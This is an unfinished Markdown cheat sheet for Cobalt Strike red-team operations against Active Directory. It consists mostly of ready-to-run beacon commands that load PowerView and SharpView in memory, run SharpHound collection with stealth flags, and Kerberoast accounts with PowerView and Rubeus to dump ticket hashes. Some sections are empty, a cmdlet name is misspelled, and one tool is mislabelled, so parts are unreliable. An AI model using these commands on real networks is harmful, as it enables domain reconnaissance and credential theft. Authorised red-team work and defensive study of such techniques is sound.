# NOTE: WORK IN PROGRESS

# Cobalt Strike & Red Team Cheat Sheet
---
## Enumeration

### Running PowerView and SharpView
```
PowerView:
# powershell-import --> Select PowerView.ps1 to import PS1 file in memory
# powershell Get-Module PowerView
# powershell Get-NetUser -Identity testuser -Domain test.lab.com

SharpView
# execute-assembly C:\SharpView.exe Invoke-CheckLocalAdminAccess --> Check servers for local admin using current privileges
```

### Running ActiveDirectory module
```
# powershell import --> Select \ADModule\Microsoft.ActiveDirectory.Management.dll  file from https://github.com/samratashok/ADModule
# powershell Get-ADDomainController -Domain test.lab.com
```

### Running Sharphound (.NET version of Bloodhound) for AD domain collection
```
Running SharpView in memory (.NET version of PowerView)
# execute-assembly C:\SharpHound.exe --CollectionMethod All --Domain test.lab.com --Stealth --excludedomaincontrollers --windowsonly --OutputDirectory C:\users\testuser\appdata\local\temp\

Collecting only user sessions to determine who is logged in and where:
# execute-assembly C:\SharpHound.exe --CollectionMethod Session,LoggedOn --Outputdirectory C:\temp\

Collection methods reference: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html
```
---
## Lateral Movement

---
## Exfiltration

### Kerberoasting
```
PowerView kerberoasting:
# powershell Get-DomainUesr -SPN --> Get users with SPN set
# powershell Invoke-Kerberoast -Identity testaccount -Domain test.lab.com | fl

Requests service tickets for all kerberoast-able accounts and return ticket hashe
# powershell Invoke-Kerberoast | fl

Rubeus kerberoasting:
# execute-assembly C:\Rubeus.exe /outfile:KerbHashes.txt /user:testaccount /domain:test.lab.com
```

---
## 

---
# References
Cobalt Strike commands cheat-sheet: https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet
Sharphound: https://github.com/BloodHoundAD/SharpHound3
